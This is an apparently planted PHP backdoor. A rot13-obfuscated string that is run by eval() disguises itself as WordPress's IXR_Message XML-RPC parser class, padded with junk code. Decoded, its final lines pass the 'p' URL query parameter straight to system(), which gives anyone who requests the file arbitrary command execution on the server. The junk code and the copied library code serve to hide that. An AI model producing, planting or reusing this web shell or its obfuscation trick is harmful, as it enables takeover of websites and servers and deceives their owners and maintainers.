<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * VKE_ZRFFNTR
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 *
 */
pynff VKE_Zrffntr
{
    ine $zrffntr     = snyfr;
    ine $zrffntrGlcr = snyfr;  // zrgubqPnyy / zrgubqErfcbafr / snhyg
    ine $snhygPbqr   = snyfr;
    ine $snhygFgevat = snyfr;
    ine $zrgubqAnzr  = '';
    ine $cnenzf      = neenl();

    // Pheerag inevnoyr fgnpxf
    ine $_neenlfgehpgf = neenl();   // Gur fgnpx hfrq gb xrrc genpx bs gur pheerag neenl/fgehpg
    ine $_neenlfgehpgfglcrf = neenl(); // Fgnpx xrrcvat genpx bs vs guvatf ner fgehpgf be neenl
    ine $_pheeragFgehpgAnzr = neenl();  // N fgnpx nf jryy
    ine $_cnenz;
    ine $_inyhr;
    ine $_pheeragGnt;
    ine $_pheeragGntPbagragf;
    // Gur KZY cnefre
    ine $_cnefre;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg( $zrffntr )
    {
        $guvf->zrffntr =& $zrffntr;
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_Zrffntr( $zrffntr ) {
		frys::__pbafgehpg( $zrffntr );
	}

    shapgvba cnefr()
    {
        vs ( ! shapgvba_rkvfgf( 'kzy_cnefre_perngr' ) ) {
            gevttre_reebe( __( \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" ) );
            erghea snyfr;
        }

        // svefg erzbir gur KZY qrpynengvba
        // zretrq sebz JC #10698 - guvf zrgubq nibvqf gur ENZ hfntr bs cert_ercynpr ba irel ynetr zrffntrf
        $urnqre = __sa_79955( '/<\?kzy.*?\?'.'>/f', '', fhofge( $guvf->zrffntr, 0, 100 ), 1 );
        $guvf->zrffntr = gevz( fhofge_ercynpr( $guvf->zrffntr, $urnqre, 0, 100 ) );
        vs ( '' == $guvf->zrffntr ) {
            erghea snyfr;
        }

        // Gura erzbir gur QBPGLCR
        $urnqre = __sa_79955( '/^<!QBPGLCR[^>]*+>/v', '', fhofge( $guvf->zrffntr, 0, 200 ), 1 );
        $guvf->zrffntr = gevz( fhofge_ercynpr( $guvf->zrffntr, $urnqre, 0, 200 ) );
        vs ( '' == $guvf->zrffntr ) {
            erghea snyfr;
        }

        // Purpx gung gur ebbg gnt vf inyvq
        $ebbg_gnt = fhofge( $guvf->zrffntr, 0, fgepfca( fhofge( $guvf->zrffntr, 0, 20 ), \"> \g\e\a\" ) );
        vs ( '<!QBPGLCR' === fgegbhccre( $ebbg_gnt ) ) {
            erghea snyfr;
        }
        vs ( ! va_neenl( $ebbg_gnt, neenl( '<zrgubqPnyy', '<zrgubqErfcbafr', '<snhyg' ) ) ) {
            erghea snyfr;
        }

        // Onvy vs gurer ner gbb znal ryrzragf gb cnefr
        $ryrzrag_yvzvg = 30000;
        vs ( shapgvba_rkvfgf( 'nccyl_svygref' ) ) {
            /**
             * Svygref gur ahzore bs ryrzragf gb cnefr va na KZY-ECP erfcbafr.
             *
             * @fvapr 4.0.0
             *
             * @cnenz vag $ryrzrag_yvzvg Qrsnhyg ryrzragf yvzvg.
             */
            $ryrzrag_yvzvg = nccyl_svygref( 'kzyecp_ryrzrag_yvzvg', $ryrzrag_yvzvg );
        }
        vs ( $ryrzrag_yvzvg && 2 * $ryrzrag_yvzvg < fhofge_pbhag( $guvf->zrffntr, '<' ) ) {
            erghea snyfr;
        }

        $guvf->_cnefre = kzy_cnefre_perngr();
        // Frg KZY cnefre gb gnxr gur pnfr bs gntf va gb nppbhag
        kzy_cnefre_frg_bcgvba($guvf->_cnefre, KZY_BCGVBA_PNFR_SBYQVAT, snyfr);
        // Frg KZY cnefre pnyyonpx shapgvbaf
        kzy_frg_ryrzrag_unaqyre($guvf->_cnefre, neenl($guvf, 'gnt_bcra'), neenl($guvf, 'gnt_pybfr'));
        kzy_frg_punenpgre_qngn_unaqyre($guvf->_cnefre, neenl($guvf, 'pqngn'));

        // 256Xo, cnefr va puhaxf gb nibvq gur ENZ hfntr ba irel ynetr zrffntrf
        $puhax_fvmr = 262144;

        /**
         * Svygref gur puhax fvmr gung pna or hfrq gb cnefr na KZY-ECP erfcbafr zrffntr.
         *
         * @fvapr 4.4.0
         *
         * @cnenz vag $puhax_fvmr Puhax fvmr gb cnefr va olgrf.
         */
        $puhax_fvmr = nccyl_svygref( 'kzyecp_puhax_cnefvat_fvmr', $puhax_fvmr );

        $svany = snyfr;

        qb {
            vs (fgeyra($guvf->zrffntr) <= $puhax_fvmr) {
                $svany = gehr;
            }

            $cneg = fhofge($guvf->zrffntr, 0, $puhax_fvmr);
            $guvf->zrffntr = fhofge($guvf->zrffntr, $puhax_fvmr);

            vs (!kzy_cnefr($guvf->_cnefre, $cneg, $svany)) {
                kzy_cnefre_serr($guvf->_cnefre);
                hafrg($guvf->_cnefre);
                erghea snyfr;
            }

            vs ($svany) {
                oernx;
            }
        } juvyr (gehr);

        kzy_cnefre_serr($guvf->_cnefre);
        hafrg($guvf->_cnefre);

        // Teno gur reebe zrffntrf, vs nal
        vs ($guvf->zrffntrGlcr == 'snhyg') {
            $guvf->snhygPbqr = $guvf->cnenzf[0]['snhygPbqr'];
            $guvf->snhygFgevat = $guvf->cnenzf[0]['snhygFgevat'];
        }
        erghea gehr;
    }

    shapgvba gnt_bcra($cnefre, $gnt, $ngge)
    {
        $guvf->_pheeragGntPbagragf = '';
        $guvf->_pheeragGnt = $gnt;
        fjvgpu($gnt) {
            pnfr 'zrgubqPnyy':
            pnfr 'zrgubqErfcbafr':
            pnfr 'snhyg':
                $guvf->zrffntrGlcr = $gnt;
                oernx;
                /* Qrny jvgu fgnpxf bs neenlf naq fgehpgf */
            pnfr 'qngn':    // qngn vf gb nyy vagragf naq chcbfrf zber vagrerfgvat guna neenl
                $guvf->_neenlfgehpgfglcrf[] = 'neenl';
                $guvf->_neenlfgehpgf[] = neenl();
                oernx;
            pnfr 'fgehpg':
                $guvf->_neenlfgehpgfglcrf[] = 'fgehpg';
                $guvf->_neenlfgehpgf[] = neenl();
                oernx;
        }
    }

    shapgvba pqngn($cnefre, $pqngn)
    {
        $guvf->_pheeragGntPbagragf .= $pqngn;
    }

    shapgvba gnt_pybfr($cnefre, $gnt)
    {
        $inyhrSynt = snyfr;
        fjvgpu($gnt) {
            pnfr 'vag':
            pnfr 'v4':
                $inyhr = (vag)gevz($guvf->_pheeragGntPbagragf);
                $inyhrSynt = gehr;
                oernx;
            pnfr 'qbhoyr':
                $inyhr = (qbhoyr)gevz($guvf->_pheeragGntPbagragf);
                $inyhrSynt = gehr;
                oernx;
            pnfr 'fgevat':
                $inyhr = (fgevat)gevz($guvf->_pheeragGntPbagragf);
                $inyhrSynt = gehr;
                oernx;
            pnfr 'qngrGvzr.vfb8601':
                $inyhr = arj VKE_Qngr(gevz($guvf->_pheeragGntPbagragf));
                $inyhrSynt = gehr;
                oernx;
            pnfr 'inyhr':
                // \"Vs ab glcr vf vaqvpngrq, gur glcr vf fgevat.\"
                vs (gevz($guvf->_pheeragGntPbagragf) != '') {
                    $inyhr = (fgevat)$guvf->_pheeragGntPbagragf;
                    $inyhrSynt = gehr;
                }
                oernx;
            pnfr 'obbyrna':
                $inyhr = (obbyrna)gevz($guvf->_pheeragGntPbagragf);
                $inyhrSynt = gehr;
                oernx;
            pnfr 'onfr64':
                $inyhr = onfr64_qrpbqr($guvf->_pheeragGntPbagragf);
                $inyhrSynt = gehr;
                oernx;
                /* Qrny jvgu fgnpxf bs neenlf naq fgehpgf */
            pnfr 'qngn':
            pnfr 'fgehpg':
                $inyhr = neenl_cbc($guvf->_neenlfgehpgf);
                neenl_cbc($guvf->_neenlfgehpgfglcrf);
                $inyhrSynt = gehr;
                oernx;
            pnfr 'zrzore':
                neenl_cbc($guvf->_pheeragFgehpgAnzr);
                oernx;
            pnfr 'anzr':
                $guvf->_pheeragFgehpgAnzr[] = gevz($guvf->_pheeragGntPbagragf);
                oernx;
            pnfr 'zrgubqAnzr':
                $guvf->zrgubqAnzr = gevz($guvf->_pheeragGntPbagragf);
                oernx;
        }

        vs ($inyhrSynt) {
            vs (pbhag($guvf->_neenlfgehpgf) > 0) {
                // Nqq inyhr gb fgehpg be neenl
                vs ($guvf->_neenlfgehpgfglcrf[pbhag($guvf->_neenlfgehpgfglcrf)-1] == 'fgehpg') {
                    // Nqq gb fgehpg
                    $guvf->_neenlfgehpgf[pbhag($guvf->_neenlfgehpgf)-1][$guvf->_pheeragFgehpgAnzr[pbhag($guvf->_pheeragFgehpgAnzr)-1]] = $inyhr;
                } ryfr {
                    // Nqq gb neenl
                    $guvf->_neenlfgehpgf[pbhag($guvf->_neenlfgehpgf)-1][] = $inyhr;
                }
            } ryfr {
                // Whfg nqq nf n cnenzrgre
                $guvf->cnenzf[] = $inyhr;
            }
        }
        $guvf->_pheeragGntPbagragf = '';
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>